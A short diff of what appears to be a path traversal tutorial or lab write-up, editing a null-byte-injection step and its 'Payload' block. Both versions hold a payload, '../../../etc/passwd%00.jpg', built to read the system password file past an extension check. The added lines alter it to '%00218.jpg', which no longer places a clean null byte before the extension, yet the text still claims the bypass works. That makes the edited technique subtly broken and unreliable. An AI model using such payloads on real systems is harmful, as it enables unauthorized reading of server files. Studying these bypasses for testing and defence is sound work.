@@ -38,7 +38,7 @@
 5. **Bypass with Null Byte Injection**  
    - Inject a null byte before `.jpg`:
      ```
-     filename=../../../etc/passwd%00.jpg
+     filename=../../../etc/passwd%00218.jpg
      ```
    - ✅ Server processes path before null byte and retrieves `/etc/passwd`
 
@@ -47,7 +47,7 @@
 ### 💣 Payload
 
 ```
-../../../etc/passwd%00.jpg
+../../../etc/passwd%00218.jpg
 
 ```
 
